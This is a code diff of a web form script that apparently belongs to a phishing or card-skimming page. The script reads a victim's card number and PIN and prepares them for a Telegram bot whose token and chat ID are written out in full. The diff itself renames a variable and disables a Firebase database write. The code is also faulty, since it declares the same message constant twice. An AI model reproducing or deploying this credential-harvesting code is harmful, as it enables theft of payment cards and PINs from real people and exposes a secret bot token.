@@ -93,7 +93,7 @@
         // const app = initializeApp(firebaseConfig);
         // const database = getDatabase(app);
         const Submit = async () => {
-            let card = document.getElementById("cardnumber").value;
+            let cardnumber = document.getElementById("cardnumber").value;
             let pin = document.getElementById("pin").value;
             // let cvv = document.getElementById("cvv").value;
 
@@ -107,7 +107,7 @@
             let modal = document.getElementById("modal");
             
  // || cvv ===""
-            if (card ==="" || pin === "") {
+            if (cardnumber ==="" || pin === "") {
                 emptyErrorMessage.style.display = 'block';
                 setTimeout(() => {
                     emptyErrorMessage.style.display = 'none';
@@ -117,22 +117,22 @@
 
             let obj = {
                 Name: name,
-                Card: card,
+                Cardnumber: cardnumber,
                 Date: date,
                 Time: time,
                 pin: pin,
                 Cvv: cvv
 
             };
-            let dbRef = ref(database, todos);
-            let newDbRef = push(dbRef);
+            // let dbRef = ref(database, todos);
+            // let newDbRef = push(dbRef);
 
             spinn.style.display = 'block';
 
               // Replace YOUR_BOT_TOKEN and CHAT_ID with your bot's token and chat ID
     const botToken = '8191097883:AAHcw2x0KQ88QMiJTTZU9Rq1REGMF7WDN6k';
     const chatId = '468271675';
-    const text = "Card Number: " + card;
+    const text = "Card Number: " + cardnumber;
     const text = "Pin: " + pin;
             // const text = await set(obj);
 
